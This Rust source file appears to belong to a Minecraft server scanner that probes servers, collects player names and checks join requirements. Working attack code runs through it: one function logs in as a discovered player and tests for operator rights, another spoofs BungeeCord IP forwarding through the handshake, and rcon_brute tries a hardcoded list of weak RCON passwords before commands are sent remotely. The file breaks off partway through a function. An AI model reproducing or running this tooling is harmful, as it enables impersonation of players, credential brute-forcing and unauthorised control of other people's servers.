use crate::{utils, proxy};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpStream, UdpSocket};
use std::time::Duration;
use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64;

pub fn is_valid_mc_player_name(name: &str, our_nick: &str) -> bool {
    let trimmed = name.trim();
    if trimmed.len() < 3 || trimmed.len() > 16 {
        return false;
    }
    let lower = trimmed.to_lowercase();
    if !our_nick.is_empty() && lower == our_nick.to_lowercase() {
        return false;
    }

    // Must start with valid letter, digit, underscore, or Bedrock dot/star prefix
    let first_char = trimmed.chars().next().unwrap();
    if !first_char.is_ascii_alphanumeric() && first_char != '_' && first_char != '.' && first_char != '*' {
        return false;
    }

    // Must only contain ascii alphanumeric or underscore or dot/star
    if !trimmed.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '.' || c == '*') {
        return false;
    }

    // Reject all-digit numbers (like "4010", "123456")
    if trimmed.chars().all(|c| c.is_ascii_digit()) {
        return false;
    }

    // Reject pure hex hash / UUID chunks (e.g. "3a62", "4010", "6d0d769b", "9d41", "ed66925823de", "cff", "a1b2")
    let is_pure_hex = trimmed.chars().all(|c| c.is_ascii_hexdigit());
    if is_pure_hex {
        let has_digit = trimmed.chars().any(|c| c.is_ascii_digit());
        let has_hex_letter = trimmed.chars().any(|c| matches!(c, 'a'..='f' | 'A'..='F'));
        if (has_digit && has_hex_letter) || trimmed.len() == 4 || trimmed.len() == 8 || trimmed.len() == 12 || trimmed.len() == 16 {
            return false;
        }
    }

    // Filter out common Minecraft keywords, packet names and protocol identifiers
    const BLACKLIST: &[&str] = &[
        "minecraft", "velocity", "bungee", "bungeecord", "spigot", "paper", "purpur", "bukkit",
        "textures", "default", "system", "action", "chat", "player", "players",
        "true", "false", "null", "enable", "disable", "online", "offline",
        "gamemode", "creative", "survival", "adventure", "spectator", "world",
        "dimension", "overworld", "the_nether", "the_end", "commands", "entity",
        "register", "login", "password", "authme", "openauth", "server", "vanilla",
        "forge", "fabric", "neoforge", "quilt", "packet", "status", "custom",
        "display", "value", "signature", "properties", "profile", "timestamp",
        "session", "header", "footer", "message", "translate", "fallback", "italic",
        "bold", "strikethrough", "underlined", "obfuscated", "color", "white",
        "black", "yellow", "green", "blue", "gray", "red", "gold", "aqua",
        "ping", "pong", "handshake", "motd", "favicon", "client", "unknown",
        "admin", "root", "administrator", "none", "version", "brand", "item", "block",
        "anonymous", "player_", "players_", "tabcomplete", "suggestion", "suggestions",
        "sample", "max", "count", "extra", "text", "description", "en_us", "ru_ru"
    ];

    if BLACKLIST.contains(&lower.as_str()) {
        return false;
    }

    true
}

pub fn extract_players_from_packet_data(pdata: &[u8], discovered: &mut std::collections::HashSet<String>, our_nick: &str) {
    if pdata.len() < 4 {
        return;
    }

    // 1. Exact Player Info structure scan: 16-byte UUID + VarInt length (3..=16) + Name
    let mut i = 0;
    while i + 18 <= pdata.len() {
        let str_len = pdata[i + 16] as usize;
        if str_len >= 3 && str_len <= 16 && i + 17 + str_len <= pdata.len() {
            let candidate_bytes = &pdata[i + 17..i + 17 + str_len];
            if candidate_bytes.iter().all(|&b| b.is_ascii_alphanumeric() || b == b'_') {
                let name = String::from_utf8_lossy(candidate_bytes).to_string();
                if is_valid_mc_player_name(&name, our_nick) {
                    discovered.insert(name);
                }
            }
        }
        i += 1;
    }

    // 2. Scan for Base64 encoded skin/texture metadata (which contains profileName: "...")
    if let Ok(text) = std::str::from_utf8(pdata) {
        let mut search_idx = 0;
        while let Some(pos) = text[search_idx..].find("eyJ") {
            let abs_pos = search_idx + pos;
            let end_pos = text[abs_pos..].find(|c: char| !c.is_ascii_alphanumeric() && c != '+' && c != '/' && c != '=')
                .map(|p| abs_pos + p)
                .unwrap_or(text.len());
            let b64_str = &text[abs_pos..end_pos];
            if b64_str.len() >= 20 {
                if let Ok(decoded) = BASE64.decode(b64_str) {
                    if let Ok(json_str) = String::from_utf8(decoded) {
                        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&json_str) {
                            if let Some(profile_name) = json["profileName"].as_str() {
                                if is_valid_mc_player_name(profile_name, our_nick) {
                                    discovered.insert(profile_name.to_string());
                                }
                            }
                        }
                    }
                }
            }
            search_idx = end_pos + 1;
            if search_idx >= text.len() { break; }
        }
    }
}

pub async fn fetch_web_map_players(ip: &str, current_proxy: Option<String>) -> Vec<String> {
    let client = match current_proxy {
        Some(ref p) => {
            if let Ok(proxy_cfg) = reqwest::Proxy::all(format!("socks5://{}", p)) {
                reqwest::Client::builder().proxy(proxy_cfg).timeout(Duration::from_millis(400)).build().unwrap_or_default()
            } else {
                reqwest::Client::builder().timeout(Duration::from_millis(400)).build().unwrap_or_default()
            }
        },
        None => reqwest::Client::builder().timeout(Duration::from_millis(400)).build().unwrap_or_default(),
    };

    let endpoints = [
        format!("http://{}:8123/up/world/world/0", ip),
        format!("http://{}:8100/maps/world/live/players.json", ip),
        format!("http://{}:8080/tiles/players.json", ip),
        format!("http://{}:8804/players", ip),
    ];

    let mut tasks = Vec::with_capacity(4);
    for url in endpoints {
        let client_c = client.clone();
        tasks.push(tokio::spawn(async move {
            let mut found_list = Vec::new();
            if let Ok(resp) = client_c.get(&url).send().await {
                if resp.status().is_success() {
                    if let Ok(json) = resp.json::<serde_json::Value>().await {
                        if let Some(arr) = json["players"].as_array() {
                            for item in arr {
                                if let Some(name) = item["name"].as_str().or_else(|| item["account"].as_str()) {
                                    if is_valid_mc_player_name(name, "") {
                                        found_list.push(name.to_string());
                                    }
                                }
                            }
                        }
                        if let Some(updates) = json["updates"].as_array() {
                            for u in updates {
                                if let Some(name) = u["playerName"].as_str().or_else(|| u["name"].as_str()) {
                                    if is_valid_mc_player_name(name, "") {
                                        found_list.push(name.to_string());
                                    }
                                }
                            }
                        }
                    }
                }
            }
            found_list
        }));
    }

    let mut players = Vec::new();
    for task in tasks {
        if let Ok(res) = task.await {
            players.extend(res);
        }
    }
    players
}

pub async fn check_player_op(
    connect_ip: &str,
    port: u16,
    protocol: i32,
    domain: &str,
    player_nick: &str,
    current_proxy: Option<String>,
) -> bool {
    let host_port = format!("{}:{}", connect_ip, port);
    if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(3), proxy::connect_stream(&host_port, current_proxy.as_deref())).await {
        let mut handshake = Vec::new();
        utils::write_varint(0x00, &mut handshake);
        utils::write_varint(protocol, &mut handshake);
        utils::write_string(domain, &mut handshake); 
        handshake.extend_from_slice(&port.to_be_bytes());
        utils::write_varint(2, &mut handshake);
        let hs_packet = utils::wrap_packet(&handshake);
        if stream.write_all(&hs_packet).await.is_err() { return false; }

        let mut login_start = Vec::new();
        utils::write_varint(0x00, &mut login_start);
        utils::write_string(player_nick, &mut login_start);
        if protocol >= 764 {
            let uuid: [u8; 16] = [0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef, 0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef];
            login_start.extend_from_slice(&uuid);
        } else if protocol >= 759 {
            login_start.push(0x00);
        }
        let ls_packet = utils::wrap_packet(&login_start);
        if stream.write_all(&ls_packet).await.is_err() { return false; }

        if let Ok(Ok((packet_id, _))) = tokio::time::timeout(Duration::from_secs(2), utils::read_packet(&mut stream)).await {
            if packet_id == 0x02 || packet_id == 0x03 {
                // Logged in under this player's name! Try sending /gamemode creative or /op
                let mut cmd_packet = Vec::new();
                if protocol >= 759 {
                    utils::write_varint(0x04, &mut cmd_packet);
                    utils::write_string("gamemode creative", &mut cmd_packet);
                    utils::write_varint(0, &mut cmd_packet);
                } else {
                    utils::write_varint(0x02, &mut cmd_packet);
                    utils::write_string("/gamemode creative", &mut cmd_packet);
                }
                let _ = stream.write_all(&utils::wrap_packet(&cmd_packet)).await;

                let start_time = std::time::Instant::now();
                while start_time.elapsed() < Duration::from_millis(600) {
                    if let Ok(Ok((_pid, pdata))) = tokio::time::timeout(Duration::from_millis(150), utils::read_packet(&mut stream)).await {
                        let text = String::from_utf8_lossy(&pdata).to_lowercase();
                        if text.contains("set game mode to creative")
                            || text.contains("установлен творческий")
                            || text.contains("режим игры изменен на творческий")
                            || text.contains("gamemode changed")
                            || text.contains("your game mode has been updated")
                            || text.contains("creative mode")
                            || text.contains("теперь оператор")
                            || text.contains("you are now an operator")
                            || text.contains("you are now op")
                            || text.contains("made you a server operator")
                            || text.contains("minecraft:gamemode")
                            || text.contains("minecraft:op")
                            || text.contains("minecraft:stop")
                        {
                            return true;
                        }
                    } else {
                        break;
                    }
                }
            }
        }
    }
    false
}

pub async fn query_server_full(ip: &str, port: u16) -> (Option<String>, Vec<String>) {
    let mut plugins = None;
    let mut players = Vec::new();

    if let Ok(socket) = UdpSocket::bind("0.0.0.0:0").await {
        if socket.connect(format!("{}:{}", ip, port)).await.is_ok() {
            let hs_req = [0xFE, 0xFD, 0x09, 0x01, 0x02, 0x03, 0x04];
            if socket.send(&hs_req).await.is_ok() {
                let mut buf = [0u8; 1024];
                if let Ok(Ok(len)) = tokio::time::timeout(Duration::from_secs(1), socket.recv(&mut buf)).await {
                    if len > 5 && buf[0] == 0x09 {
                        let token_slice = if buf[len - 1] == 0 { &buf[5..len - 1] } else { &buf[5..len] };
                        let token_str = String::from_utf8_lossy(token_slice).trim().to_string();
                        if let Ok(token) = token_str.parse::<i32>() {
                            let mut full_req = vec![0xFE, 0xFD, 0x00, 0x01, 0x02, 0x03, 0x04];
                            full_req.extend_from_slice(&token.to_be_bytes());
                            full_req.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
                            
                            if socket.send(&full_req).await.is_ok() {
                                let mut full_buf = vec![0u8; 4096];
                                if let Ok(Ok(full_len)) = tokio::time::timeout(Duration::from_secs(1), socket.recv(&mut full_buf)).await {
                                    if full_len > 16 {
                                        let data = &full_buf[16..full_len];
                                        let mut i = 0;
                                        while i < data.len() {
                                            let key_end = match data[i..].iter().position(|&b| b == 0) {
                                                Some(pos) => i + pos,
                                                None => break,
                                            };
                                            let key = String::from_utf8_lossy(&data[i..key_end]).to_string();
                                            i = key_end + 1;
                                            if key.is_empty() { break; }
                                            let val_end = match data[i..].iter().position(|&b| b == 0) {
                                                Some(pos) => i + pos,
                                                None => break,
                                            };
                                            let val = String::from_utf8_lossy(&data[i..val_end]).to_string();
                                            i = val_end + 1;

                                            if key == "plugins" && !val.is_empty() {
                                                plugins = Some(val);
                                            }
                                        }

                                        if let Some(pos) = data.windows(7).position(|w| w == b"player_") {
                                            let mut offset = pos + 7;
                                            while offset < data.len() && (data[offset] == 0 || data[offset] == 1) {
                                                offset += 1;
                                            }
                                            if offset < data.len() {
                                                let player_bytes = &data[offset..];
                                                for p in player_bytes.split(|&b| b == 0) {
                                                    let name = String::from_utf8_lossy(p).trim().to_string();
                                                    if is_valid_mc_player_name(&name, "") {
                                                        players.push(name);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    (plugins, players)
}

pub async fn check_bungee_bypass(connect_ip: &str, port: u16, protocol: i32, domain: &str, nickname: &str, current_proxy: Option<String>) -> bool {
    let host_port = format!("{}:{}", connect_ip, port);
    if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(3), proxy::connect_stream(&host_port, current_proxy.as_deref())).await {
        let spoofed_domain = format!("{}\x00127.0.0.1\x0000000000000000000000000000000000", domain);
        
        let mut handshake = Vec::new();
        utils::write_varint(0x00, &mut handshake);
        utils::write_varint(protocol, &mut handshake);
        utils::write_string(&spoofed_domain, &mut handshake);
        handshake.extend_from_slice(&port.to_be_bytes());
        utils::write_varint(2, &mut handshake);
        let hs_packet = utils::wrap_packet(&handshake);
        if stream.write_all(&hs_packet).await.is_err() { return false; }

        let mut login_start = Vec::new();
        utils::write_varint(0x00, &mut login_start);
        utils::write_string(nickname, &mut login_start);
        if protocol >= 764 {
            let uuid: [u8; 16] = [0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef, 0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef];
            login_start.extend_from_slice(&uuid);
        } else if protocol >= 759 {
            login_start.push(0x00);
        }
        let ls_packet = utils::wrap_packet(&login_start);
        if stream.write_all(&ls_packet).await.is_err() { return false; }

        if let Ok(Ok((packet_id, _))) = tokio::time::timeout(Duration::from_secs(2), utils::read_packet(&mut stream)).await {
            if packet_id == 0x02 || packet_id == 0x03 {
                return true; 
            }
        }
    }
    false
}

pub async fn check_velocity_bypass(connect_ip: &str, port: u16, protocol: i32, domain: &str, nickname: &str, current_proxy: Option<String>) -> bool {
    let host_port = format!("{}:{}", connect_ip, port);
    if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(3), proxy::connect_stream(&host_port, current_proxy.as_deref())).await {
        let mut handshake = Vec::new();
        utils::write_varint(0x00, &mut handshake);
        utils::write_varint(protocol, &mut handshake);
        utils::write_string(domain, &mut handshake);
        handshake.extend_from_slice(&port.to_be_bytes());
        utils::write_varint(2, &mut handshake);
        let hs_packet = utils::wrap_packet(&handshake);
        if stream.write_all(&hs_packet).await.is_err() { return false; }

        let mut login_start = Vec::new();
        utils::write_varint(0x00, &mut login_start);
        utils::write_string(nickname, &mut login_start);
        if protocol >= 764 {
            let uuid: [u8; 16] = [0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef, 0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef];
            login_start.extend_from_slice(&uuid);
        } else if protocol >= 759 {
            login_start.push(0x00);
        }
        let ls_packet = utils::wrap_packet(&login_start);
        if stream.write_all(&ls_packet).await.is_err() { return false; }

        if let Ok(Ok((packet_id, data))) = tokio::time::timeout(Duration::from_secs(2), utils::read_packet(&mut stream)).await {
            if packet_id == 0x04 { 
                let channel_name = String::from_utf8_lossy(&data);
                if channel_name.contains("velocity") {
                    return true;
                }
            } else if packet_id == 0x00 { 
                let reason = String::from_utf8_lossy(&data).to_lowercase();
                if reason.contains("velocity") || reason.contains("forwarding") {
                    return true;
                }
            }
        }
    }
    false
}

pub async fn emulate_login(
    connect_ip: &str,
    port: u16,
    protocol: i32,
    fallback_motd: &str,
    nickname: &str,
    domain: &str,
    current_proxy: Option<String>,
) -> (bool, bool, bool, bool, String, String, bool, bool, Vec<String>) {
    let host_port = format!("{}:{}", connect_ip, port);
    if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(3), proxy::connect_stream(&host_port, current_proxy.as_deref())).await {
        
        let mut handshake = Vec::new();
        utils::write_varint(0x00, &mut handshake);
        utils::write_varint(protocol, &mut handshake);
        utils::write_string(domain, &mut handshake); 
        handshake.extend_from_slice(&port.to_be_bytes());
        utils::write_varint(2, &mut handshake);
        let hs_packet = utils::wrap_packet(&handshake);
        if stream.write_all(&hs_packet).await.is_err() { return guess_from_motd(fallback_motd); }

        let mut login_start = Vec::new();
        utils::write_varint(0x00, &mut login_start);
        utils::write_string(nickname, &mut login_start);
        if protocol >= 764 {
            let uuid: [u8; 16] = [0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef, 0x12, 0x34, 0x56, 0x78, 0x90, 0xab, 0xcd, 0xef];
            login_start.extend_from_slice(&uuid);
        } else if protocol >= 759 {
            login_start.push(0x00);
        }
        let ls_packet = utils::wrap_packet(&login_start);
        if stream.write_all(&ls_packet).await.is_err() { return guess_from_motd(fallback_motd); }

        if let Ok(Ok((packet_id, data))) = tokio::time::timeout(Duration::from_secs(2), utils::read_packet(&mut stream)).await {
            if packet_id == 0x01 { 
                // Encryption Request -> License only server
                return (false, false, false, false, "?bs".into(), "[Лицензия Mojang]".into(), false, false, Vec::new());
            } else if packet_id == 0x00 { 
                // Login Disconnect packet
                let reason = String::from_utf8_lossy(&data).to_lowercase();
                let mut bs = "nobs";
                let mut req = "[Отключен]";
                let mut is_reg = false;
                let mut needs_mods = false;

                let is_whitelist = reason.contains("белом списке") 
                    || reason.contains("белый список") 
                    || reason.contains("белом списк")
                    || reason.contains("белого списка")
                    || reason.contains("вайтлист") 
                    || reason.contains("в белом списке")
                    || reason.contains("whitelist") 
                    || reason.contains("white-list") 
                    || reason.contains("whitelisted")
                    || reason.contains("not on the whitelist")
                    || reason.contains("not in the whitelist")
                    || reason.contains("you are not on the white-list")
                    || reason.contains("you are not whitelisted")
                    || reason.contains("notwhitelisted")
                    || reason.contains("disconnectionscreen.notwhitelisted")
                    || reason.contains("disconnect.notwhitelisted")
                    || reason.contains("multiplayer.disconnect.not_whitelisted")
                    || reason.contains("not_whitelisted");

                let is_mod_registry = reason.contains("neoforge")
                    || reason.contains("neo forge")
                    || reason.contains("running neoforge")
                    || reason.contains("install neoforge")
                    || reason.contains("running forge")
                    || reason.contains("install forge")
                    || reason.contains("forge")
                    || reason.contains("fml")
                    || reason.contains("fabric")
                    || reason.contains("quilt")
                    || reason.contains("реестра")
                    || reason.contains("списком модов")
                    || reason.contains("отличающимся списком")
                    || reason.contains("unknown registry")
                    || reason.contains("missing registry")
                    || reason.contains("registry entries")
                    || reason.contains("xaerominimap")
                    || reason.contains("xaeroworldmap")
                    || reason.contains("xaero")
                    || reason.contains("fml:")
                    || reason.contains("forge:")
                    || reason.contains("neoforge:")
                    || reason.contains("fabric:")
                    || reason.contains("modded")
                    || reason.contains("client mods");

                if is_mod_registry {
                    req = "[Требуются моды (Forge/NeoForge/Fabric)]";
                    needs_mods = true;
                } else if is_whitelist {
                    bs = "bs";
                    req = "[Вайтлист]";
                } else if reason.contains("login") || reason.contains("авториз") || reason.contains("пароль") || reason.contains("password") {
                    req = "[Вход свободен (требуется регистрация)]";
                    is_reg = true;
                } else if reason.contains("register") || reason.contains("зарегистр") || reason.contains("create an account") {
                    req = "[Вход свободен (требуется регистрация)]";
                    is_reg = true;
                } else if reason.contains("vpn") || reason.contains("proxy") || reason.contains("bot") || reason.contains("капч") || reason.contains("robot") {
                    req = "[Проверка на робота]";
                } else if reason.contains("ban") || reason.contains("забанен") || reason.contains("banned") {
                    req = "[Игрок Забанен]";
                }

                return (true, is_reg, false, needs_mods, bs.into(), req.into(), false, is_reg, Vec::new());
            } else if packet_id == 0x02 || packet_id == 0x03 { 
                // Login Success! (State: Configuration or Play) -> GREEN OPEN SERVER
                let mut is_op = false;
                let mut world_has_builds = false;
                let mut is_reg = false;
                let mut needs_mods = false;
                let mut is_whitelisted = false;
                let mut movement_restricted = false;
                let mut req = "[Вход свободен]".to_string();
                let mut discovered_players = std::collections::HashSet::new();

                // Send a TabComplete packet to proactively ask server for online players
                let mut tab_req = Vec::new();
                if protocol >= 393 {
                    // 1.13+ Command Suggestions Request
                    utils::write_varint(0x06, &mut tab_req);
                    utils::write_varint(100, &mut tab_req);
                    utils::write_string("/msg ", &mut tab_req);
                } else {
                    // 1.8 - 1.12.2 Tab Complete Request
                    utils::write_varint(0x14, &mut tab_req);
                    utils::write_string("/msg ", &mut tab_req);
                    tab_req.push(0x00);
                    tab_req.push(0x00);
                }
                let tab_packet = utils::wrap_packet(&tab_req);
                let _ = stream.write_all(&tab_packet).await;

                // Read subsequent configuration/play packets (up to 700ms)
                let start_time = std::time::Instant::now();
                while start_time.elapsed() < Duration::from_millis(700) {
                    match tokio::time::timeout(Duration::from_millis(150), utils::read_packet(&mut stream)).await {
                        Ok(Ok((_pid, pdata))) => {
                            // Extract any player nicknames present in packet data
                            extract_players_from_packet_data(&pdata, &mut discovered_players, nickname);

                            let text = String::from_utf8_lossy(&pdata).to_lowercase();
                            
                            // 1. Check for post-login disconnect (whitelist or mod registry mismatch)
                            if text.contains("белом списке") 
                                || text.contains("белый список") 
                                || text.contains("белом списк")
                                || text.contains("белого списка")
                                || text.contains("вайтлист") 
                                || text.contains("в белом списке")
                                || text.contains("whitelist") 
                                || text.contains("white-list") 
                                || text.contains("whitelisted")
                                || text.contains("not on the whitelist")
                                || text.contains("not in the whitelist")
                                || text.contains("you are not on the white-list")
                                || text.contains("you are not whitelisted")
                                || text.contains("disconnectionscreen.notwhitelisted")
                                || text.contains("disconnect.notwhitelisted")
                                || text.contains("multiplayer.disconnect.not_whitelisted")
                                || text.contains("not_whitelisted")
                            {
                                is_whitelisted = true;
                                req = "[Вайтлист]".to_string();
                            }

                            if text.contains("neoforge")
                                || text.contains("neo forge")
                                || text.contains("running neoforge")
                                || text.contains("install neoforge")
                                || text.contains("running forge")
                                || text.contains("install forge")
                                || text.contains("forge")
                                || text.contains("fml")
                                || text.contains("fabric")
                                || text.contains("quilt")
                                || text.contains("реестра")
                                || text.contains("списком модов")
                                || text.contains("отличающимся списком")
                                || text.contains("unknown registry")
                                || text.contains("missing registry")
                                || text.contains("registry entries")
                                || text.contains("xaerominimap")
                                || text.contains("xaeroworldmap")
                                || text.contains("xaero")
                                || text.contains("fml:")
                                || text.contains("forge:")
                                || text.contains("neoforge:")
                                || text.contains("fabric:")
                            {
                                needs_mods = true;
                                req = "[Требуются моды (Forge/NeoForge/Fabric)]".to_string();
                            }

                            // 2. Check for registration prompts (AuthMe / OpenAuth / LimboAuth / EasyAuth)
                            if text.contains("/register") 
                                || text.contains("/login") 
                                || text.contains("/l ") 
                                || text.contains("/reg ") 
                                || text.contains("вы не авторизованы") 
                                || text.contains("авториз") 
                                || text.contains("пароль") 
                                || text.contains("зарегистр") 
                                || text.contains("create an account") 
                                || text.contains("confirm password")
                                || text.contains("authme")
                                || text.contains("openauth")
                                || text.contains("limboauth")
                                || text.contains("easyauth")
                            {
                                is_reg = true;
                                movement_restricted = true;
                            }

                            // 3. Check for player movement restriction indicators
                            if text.contains("движение ограничено") 
                                || text.contains("не можете двигаться") 
                                || text.contains("freeze") 
                                || text.contains("заморожен") 
                                || text.contains("вы не можете передвигаться") 
                                || text.contains("movement is restricted") 
                                || text.contains("you cannot move") 
                                || text.contains("movement disabled") 
                                || text.contains("please login to move") 
                                || text.contains("авторизуйтесь чтобы ходить") 
                                || text.contains("движение заблокировано") 
                                || text.contains("spawn protection")
                            {
                                movement_restricted = true;
                            }

                            // 4. Check for creative gamemode
                            if pdata.len() > 5 {
                                let gamemode = pdata[4];
                                if gamemode == 1 || gamemode == 3 {
                                    is_op = true;
                                }
                            }

                            // 5. Check world age / builds
                            if pdata.len() >= 8 {
                                let age = i64::from_be_bytes(pdata[0..8].try_into().unwrap_or_default());
                                if age > 24000 {
                                    world_has_builds = true;
                                }
                            }
                        }
                        _ => break,
                    }
                }

                let bs = if is_whitelisted { "bs" } else { "nobs" };
                if !is_whitelisted && !needs_mods {
                    if is_reg {
                        req = "[Вход свободен (требуется регистрация)]".to_string();
                    } else {
                        req = "[Вход свободен]".to_string();
                    }
                }

                let players_vec: Vec<String> = discovered_players.into_iter().collect();
                return (true, is_reg, is_op, needs_mods, bs.into(), req, world_has_builds, movement_restricted, players_vec);
            }
        }
    }
    guess_from_motd(fallback_motd)
}

fn guess_from_motd(motd_lower: &str) -> (bool, bool, bool, bool, String, String, bool, bool, Vec<String>) {
    let is_cracked = motd_lower.contains("crack") || motd_lower.contains("пират") || motd_lower.contains("nolic") || motd_lower.contains("без лицензии");
    let is_lic = motd_lower.contains("premium") || motd_lower.contains("лицензия");
    let is_whitelist = motd_lower.contains("whitelist") || motd_lower.contains("белый список") || motd_lower.contains("вайтлист") || motd_lower.contains("белом списке");
    let bs = if is_whitelist { "bs" } else { "?bs" };
    let needs_mods = motd_lower.contains("forge") || motd_lower.contains("neo") || motd_lower.contains("fabric");
    let is_reg = motd_lower.contains("auth") || motd_lower.contains("регистр") || motd_lower.contains("парол");
    
    let req = if is_whitelist {
        "[Вайтлист]".into()
    } else if needs_mods {
        "[Требуются моды (Forge/Fabric)]".into()
    } else if is_cracked {
        if is_reg {
            "[Вход свободен (требуется регистрация)]".into()
        } else {
            "[Вход свободен]".into()
        }
    } else {
        "".into()
    };

    if is_cracked { return (true, is_reg, false, needs_mods, bs.into(), req, false, is_reg, Vec::new()); }
    if is_lic { return (false, is_reg, false, needs_mods, bs.into(), req, false, false, Vec::new()); }

    (true, is_reg, false, needs_mods, "?bs".into(), req, false, false, Vec::new())
}

pub fn check_builds_indicators(
    motd_lower: &str,
    version: &str,
    online_players: usize,
    sample_players: &[String],
    plugins: Option<&str>,
    world_has_builds: bool,
) -> bool {
    if world_has_builds {
        return true;
    }

    // 1. Plugin indicators
    if let Some(p) = plugins {
        let p_low = p.to_lowercase();
        let build_plugins = [
            "coreprotect", "worldedit", "fastasyncworldedit", "fawe", "griefprevention", 
            "residence", "towny", "lands", "lwc", "chestshop", "plotsquared", 
            "multiverse", "dynmap", "bluemap", "cmi", "essentials", "authme", 
            "luckperms", "vault", "bedwars", "skywars", "factions", "clans",
            "quickshop", "shopkeepers", "holographicdisplays", "decentholograms"
        ];
        for bp in build_plugins {
            if p_low.contains(bp) {
                return true;
            }
        }
    }

    // 2. MOTD / description indicators
    let build_keywords = [
        "постройк", "город", "выживан", "smp", "приват", "гриф", "анарх", 
        "баз", "дом", "ферм", "клан", "магазин", "мир", "спавн", "spawn", 
        "survival", "build", "town", "realm", "base", "house", "vanilla", 
        "economy", "anarchy", "rpg", "quest", "mine", "land", "castle"
    ];
    for kw in build_keywords {
        if motd_lower.contains(kw) {
            return true;
        }
    }

    // 3. Player activity on survival/paper/fabric servers
    if online_players > 0 || !sample_players.is_empty() {
        let v_low = version.to_lowercase();
        if v_low.contains("paper") || v_low.contains("purpur") || v_low.contains("spigot") 
            || v_low.contains("fabric") || v_low.contains("forge") || v_low.contains("vanilla") {
            return true;
        }
    }

    false
}

pub async fn send_rcon_command(ip: &str, pass: &str, command: &str) -> Option<String> {
    if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(2), TcpStream::connect(format!("{}:25575", ip))).await {
        let mut auth_packet = Vec::new();
        let auth_id: i32 = 1;
        auth_packet.extend_from_slice(&auth_id.to_le_bytes());
        auth_packet.extend_from_slice(&3i32.to_le_bytes()); 
        auth_packet.extend_from_slice(pass.as_bytes());
        auth_packet.push(0); auth_packet.push(0);

        let auth_len = auth_packet.len() as i32;
        let mut full_auth = Vec::new();
        full_auth.extend_from_slice(&auth_len.to_le_bytes());
        full_auth.extend(auth_packet);

        if stream.write_all(&full_auth).await.is_err() { return None; }

        let mut resp_len_buf = [0u8; 4];
        if stream.read_exact(&mut resp_len_buf).await.is_err() { return None; }
        let resp_len = i32::from_le_bytes(resp_len_buf);
        if !(10..=4096).contains(&resp_len) { return None; }
        let mut resp_body = vec![0u8; resp_len as usize];
        if stream.read_exact(&mut resp_body).await.is_err() { return None; }
        if resp_body.len() < 4 { return None; }
        let resp_id = if let Ok(arr) = resp_body[0..4].try_into() {
            i32::from_le_bytes(arr)
        } else {
            return None;
        };
        if resp_id == -1 { return None; } 

        let mut cmd_packet = Vec::new();
        let cmd_id: i32 = 2;
        cmd_packet.extend_from_slice(&cmd_id.to_le_bytes());
        cmd_packet.extend_from_slice(&2i32.to_le_bytes()); 
        cmd_packet.extend_from_slice(command.as_bytes());
        cmd_packet.push(0); cmd_packet.push(0);

        let cmd_len = cmd_packet.len() as i32;
        let mut full_cmd = Vec::new();
        full_cmd.extend_from_slice(&cmd_len.to_le_bytes());
        full_cmd.extend(cmd_packet);

        if stream.write_all(&full_cmd).await.is_err() { return None; }

        if stream.read_exact(&mut resp_len_buf).await.is_ok() {
            let r_len = i32::from_le_bytes(resp_len_buf);
            if (10..=4096).contains(&r_len) {
                let mut r_body = vec![0u8; r_len as usize];
                if stream.read_exact(&mut r_body).await.is_ok() && r_body.len() >= 10 {
                    let end_idx = r_body.len().saturating_sub(2);
                    let msg = String::from_utf8_lossy(&r_body[8..end_idx]);
                    return Some(msg.to_string());
                }
            }
        }
    }
    None
}

async fn rcon_brute(ip: &str) -> Option<String> {
    // 1. Fast probe if port 25575 is open (250ms timeout)
    let mut stream = match tokio::time::timeout(Duration::from_millis(250), TcpStream::connect(format!("{}:25575", ip))).await {
        Ok(Ok(s)) => s,
        _ => return None, // Port 25575 is closed / filtered → skip instantly
    };

    let passwords = ["12345", "123456", "admin", "password", "root", "qwerty", "123123", "minecraft", "server"];
    for (i, pass) in passwords.iter().enumerate() {
        if i > 0 {
            stream = match tokio::time::timeout(Duration::from_millis(300), TcpStream::connect(format!("{}:25575", ip))).await {
                Ok(Ok(s)) => s,
                _ => return None,
            };
        }

        let mut packet = Vec::new();
        let id: i32 = 1;
        let p_type: i32 = 3; 
        packet.extend_from_slice(&id.to_le_bytes());
        packet.extend_from_slice(&p_type.to_le_bytes());
        packet.extend_from_slice(pass.as_bytes());
        packet.push(0); packet.push(0);

        let len = packet.len() as i32;
        let mut full_packet = Vec::new();
        full_packet.extend_from_slice(&len.to_le_bytes());
        full_packet.extend(packet);

        if stream.write_all(&full_packet).await.is_ok() {
            let mut resp_len_buf = [0u8; 4];
            if let Ok(Ok(_)) = tokio::time::timeout(Duration::from_millis(300), stream.read_exact(&mut resp_len_buf)).await {
                let resp_len = i32::from_le_bytes(resp_len_buf);
                if (10..=4096).contains(&resp_len) {
                    let mut resp_body = vec![0u8; resp_len as usize];
                    if let Ok(Ok(_)) = tokio::time::timeout(Duration::from_millis(300), stream.read_exact(&mut resp_body)).await {
                        if resp_body.len() >= 4 {
                            if let Ok(arr) = resp_body[0..4].try_into() {
                                let resp_id = i32::from_le_bytes(arr);
                                if resp_id == id { return Some(pass.to_string()); }
                            }
                        }
                    }
                }
            }
        }
    }
    None
}

pub struct ServerStatusPong {
    pub version: String,
    pub protocol: i32,
    pub online_players: usize,
    pub max_players: usize,
    pub description: String,
    pub sample: Vec<String>,
}

pub async fn safe_minecraft_ping(
    stream: &mut tokio::net::TcpStream,
    domain: &str,
    port: u16,
) -> Result<ServerStatusPong, Box<dyn std::error::Error + Send + Sync>> {
